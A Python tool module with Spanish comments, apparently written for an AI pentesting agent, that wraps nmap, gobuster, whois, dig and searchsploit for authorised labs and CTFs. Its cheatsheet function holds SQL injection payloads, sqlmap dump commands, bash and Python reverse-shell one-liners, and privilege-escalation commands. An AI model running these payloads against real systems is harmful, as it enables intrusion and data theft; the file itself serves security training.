import subprocess
import json
import os

# ============================================================================
# HERRAMIENTAS DE RECONOCIMIENTO Y ESCANEO
# ============================================================================

def nmap_scan(target: str, flags: str = "-sV") -> dict:
    """Realiza un escaneo de puertos con nmap en un objetivo específico.
    
    Esta herramienta ejecuta nmap para descubrir puertos abiertos y servicios.
    SOLO úsala en entornos autorizados y legales (labs, CTFs, máquinas propias).
    
    Args:
        target (str): Dirección IP o dominio del objetivo a escanear.
        flags (str): Banderas de nmap. Por defecto '-sV' (detección de versiones).
                     Ejemplos: '-sV -p-' (todos los puertos), '-sC -sV' (scripts y versiones).
    
    Returns:
        dict: status y resultado del escaneo o mensaje de error.
    """
    if not target:
        return {
            "status": "error",
            "error_message": "Se requiere el parámetro 'target' (IP o dominio)."
        }
    
    try:
        cmd = ["nmap"] + flags.split() + [target]
        result = subprocess.run(
            cmd, 
            capture_output=True, 
            text=True, 
            timeout=120
        )
        
        if result.returncode == 0:
            return {
                "status": "success",
                "command": " ".join(cmd),
                "result": result.stdout
            }
        else:
            return {
                "status": "error",
                "command": " ".join(cmd),
                "error_message": result.stderr
            }
    except subprocess.TimeoutExpired:
        return {
            "status": "error",
            "error_message": "El escaneo excedió el timeout de 120 segundos."
        }
    except FileNotFoundError:
        return {
            "status": "error",
            "error_message": "nmap no está instalado. Instálalo con: sudo apt install nmap"
        }
    except Exception as e:
        return {
            "status": "error",
            "error_message": f"Excepción al ejecutar nmap: {str(e)}"
        }


def ping_check(target: str, count: int = 4) -> dict:
    """Verifica si un host está activo usando ping.
    
    Útil para verificar conectividad antes de hacer escaneos más intensivos.
    
    Args:
        target (str): Dirección IP o dominio a verificar.
        count (int): Número de paquetes ICMP a enviar. Por defecto 4.
    
    Returns:
        dict: status, tiempo de respuesta y resultado.
    """
    if not target:
        return {
            "status": "error",
            "error_message": "Se requiere el parámetro 'target'."
        }
    
    try:
        cmd = ["ping", "-c", str(count), target]
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        is_alive = result.returncode == 0
        
        return {
            "status": "success",
            "target": target,
            "is_alive": is_alive,
            "result": result.stdout if is_alive else "Host no responde",
            "summary": f"Host {'ACTIVO' if is_alive else 'INACTIVO'}"
        }
    except Exception as e:
        return {
            "status": "error",
            "error_message": f"Error al ejecutar ping: {str(e)}"
        }


def gobuster_dir(target_url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt", threads: int = 10) -> dict:
    """Realiza fuzzing de directorios web con gobuster.
    
    Descubre directorios y archivos ocultos en aplicaciones web.
    
    Args:
        target_url (str): URL del sitio web objetivo (ej: http://example.com).
        wordlist (str): Ruta al archivo de wordlist. Por defecto usa dirb/common.txt.
        threads (int): Número de threads concurrentes. Por defecto 10.
    
    Returns:
        dict: status y directorios/archivos encontrados.
    """
    if not target_url:
        return {
            "status": "error",
            "error_message": "Se requiere el parámetro 'target_url'."
        }
    
    if not os.path.exists(wordlist):
        return {
            "status": "error",
            "error_message": f"Wordlist no encontrada: {wordlist}"
        }
    
    try:
        cmd = [
            "gobuster", "dir",
            "-u", target_url,
            "-w", wordlist,
            "-t", str(threads),
            "-q"  # Quiet mode
        ]
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=300  # 5 minutos
        )
        
        return {
            "status": "success",
            "command": " ".join(cmd),
            "result": result.stdout,
            "target": target_url
        }
    except FileNotFoundError:
        return {
            "status": "error",
            "error_message": "gobuster no está instalado. Instálalo con: sudo apt install gobuster"
        }
    except subprocess.TimeoutExpired:
        return {
            "status": "error",
            "error_message": "El fuzzing excedió el timeout de 5 minutos."
        }
    except Exception as e:
        return {
            "status": "error",
            "error_message": f"Error al ejecutar gobuster: {str(e)}"
        }


# ============================================================================
# HERRAMIENTAS DE ANÁLISIS Y ENUMERACIÓN
# ============================================================================

def whois_lookup(domain: str) -> dict:
    """Obtiene información de registro de un dominio usando whois.
    
    Útil para reconocimiento pasivo y obtener información del propietario.
    
    Args:
        domain (str): Nombre de dominio a consultar (ej: example.com).
    
    Returns:
        dict: status e información de registro del dominio.
    """
    if not domain:
        return {
            "status": "error",
            "error_message": "Se requiere el parámetro 'domain'."
        }
    
    try:
        cmd = ["whois", domain]
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        return {
            "status": "success",
            "domain": domain,
            "result": result.stdout
        }
    except FileNotFoundError:
        return {
            "status": "error",
            "error_message": "whois no está instalado. Instálalo con: sudo apt install whois"
        }
    except Exception as e:
        return {
            "status": "error",
            "error_message": f"Error al ejecutar whois: {str(e)}"
        }


def dns_lookup(domain: str, record_type: str = "A") -> dict:
    """Realiza consultas DNS para obtener registros de un dominio.
    
    Args:
        domain (str): Dominio a consultar (ej: example.com).
        record_type (str): Tipo de registro DNS. Opciones: A, AAAA, MX, NS, TXT, CNAME.
                          Por defecto 'A'.
    
    Returns:
        dict: status y registros DNS encontrados.
    """
    if not domain:
        return {
            "status": "error",
            "error_message": "Se requiere el parámetro 'domain'."
        }
    
    valid_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]
    if record_type.upper() not in valid_types:
        return {
            "status": "error",
            "error_message": f"Tipo de registro inválido. Usa: {', '.join(valid_types)}"
        }
    
    try:
        cmd = ["dig", "+short", domain, record_type.upper()]
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=15
        )
        
        return {
            "status": "success",
            "domain": domain,
            "record_type": record_type.upper(),
            "result": result.stdout.strip() if result.stdout else "No se encontraron registros"
        }
    except FileNotFoundError:
        return {
            "status": "error",
            "error_message": "dig no está instalado. Instálalo con: sudo apt install dnsutils"
        }
    except Exception as e:
        return {
            "status": "error",
            "error_message": f"Error al ejecutar dig: {str(e)}"
        }


# ============================================================================
# HERRAMIENTAS DE UTILIDAD Y REFERENCIA
# ============================================================================

def search_exploit(keyword: str, max_results: int = 10) -> dict:
    """Busca exploits relacionados con un keyword usando searchsploit.
    
    Consulta la base de datos local de Exploit-DB para encontrar exploits conocidos.
    
    Args:
        keyword (str): Término de búsqueda (nombre de software, CVE, etc).
        max_results (int): Número máximo de resultados. Por defecto 10.
    
    Returns:
        dict: status y lista de exploits encontrados.
    """
    if not keyword:
        return {
            "status": "error",
            "error_message": "Se requiere el parámetro 'keyword'."
        }
    
    try:
        cmd = ["searchsploit", "-t", keyword]
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        # Limitar resultados
        lines = result.stdout.split('\n')
        limited_output = '\n'.join(lines[:max_results + 5])  # +5 para headers
        
        return {
            "status": "success",
            "keyword": keyword,
            "result": limited_output,
            "note": f"Mostrando primeros {max_results} resultados"
        }
    except FileNotFoundError:
        return {
            "status": "error",
            "error_message": "searchsploit no está instalado. Instala exploitdb."
        }
    except Exception as e:
        return {
            "status": "error",
            "error_message": f"Error al buscar exploits: {str(e)}"
        }


def get_cheatsheet(topic: str) -> dict:
    """Proporciona cheatsheets y guías rápidas de herramientas comunes.
    
    Args:
        topic (str): Tema del cheatsheet. Opciones: nmap, metasploit, burp, 
                     sqlinjection, xss, privilege-escalation, reverse-shell.
    
    Returns:
        dict: status y contenido del cheatsheet.
    """
    cheatsheets = {
        "nmap": """
🔍 NMAP CHEATSHEET

Escaneo básico:
  nmap <target>                    # Escaneo simple
  nmap -sV <target>                # Detección de versiones
  nmap -sC <target>                # Scripts por defecto
  nmap -p- <target>                # Todos los puertos
  nmap -A <target>                 # Escaneo agresivo

Escaneo sigiloso:
  nmap -sS <target>                # SYN scan (sigiloso)
  nmap -sU <target>                # UDP scan
  nmap -f <target>                 # Fragmentar paquetes

Escaneo rápido:
  nmap -T4 -F <target>             # Fast scan
  nmap --top-ports 100 <target>   # Top 100 puertos
        """,
        
        "metasploit": """
🎯 METASPLOIT CHEATSHEET

Comandos básicos:
  msfconsole                       # Iniciar Metasploit
  search <keyword>                 # Buscar módulos
  use <module>                     # Seleccionar módulo
  show options                     # Ver opciones
  set RHOSTS <target>              # Configurar objetivo
  exploit                          # Ejecutar exploit

Útiles:
  sessions -l                      # Listar sesiones
  sessions -i <id>                 # Interactuar con sesión
  background                       # Enviar sesión al fondo
  db_nmap <options> <target>       # nmap integrado
        """,
        
        "sqlinjection": """
💉 SQL INJECTION CHEATSHEET

Detección básica:
  ' OR '1'='1                      # Bypass simple
  ' OR 1=1--                       # Comentario SQL
  ' UNION SELECT NULL--            # Union-based

Enumeración:
  ' UNION SELECT @@version--       # Versión DB
  ' UNION SELECT table_name FROM information_schema.tables--
  
SQLMap:
  sqlmap -u "url" --dbs            # Listar databases
  sqlmap -u "url" -D <db> --tables # Listar tablas
  sqlmap -u "url" --dump           # Dump data
        """,
        
        "reverse-shell": """
🐚 REVERSE SHELL CHEATSHEET

Bash:
  bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

Python:
  python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

Netcat listener:
  nc -lvnp <PORT>                  # En tu máquina

Upgrade shell:
  python -c 'import pty;pty.spawn("/bin/bash")'
  CTRL+Z
  stty raw -echo; fg
  export TERM=xterm
        """,
        
        "privilege-escalation": """
🔓 PRIVILEGE ESCALATION CHEATSHEET

Linux:
  sudo -l                          # Comandos sudo disponibles
  find / -perm -4000 2>/dev/null   # Buscar SUID binaries
  cat /etc/crontab                 # Revisar cron jobs
  ps aux | grep root               # Procesos de root
  
Scripts útiles:
  LinPEAS                          # Automated enumeration
  linenum.sh                       # Enumeration script

Windows:
  whoami /priv                     # Privilegios actuales
  net user                         # Listar usuarios
  systeminfo                       # Info del sistema
        """
    }
    
    topic_lower = topic.lower().replace(" ", "-")
    
    if topic_lower in cheatsheets:
        return {
            "status": "success",
            "topic": topic,
            "cheatsheet": cheatsheets[topic_lower]
        }
    else:
        available = ", ".join(cheatsheets.keys())
        return {
            "status": "error",
            "error_message": f"Cheatsheet no disponible. Temas disponibles: {available}"
        }
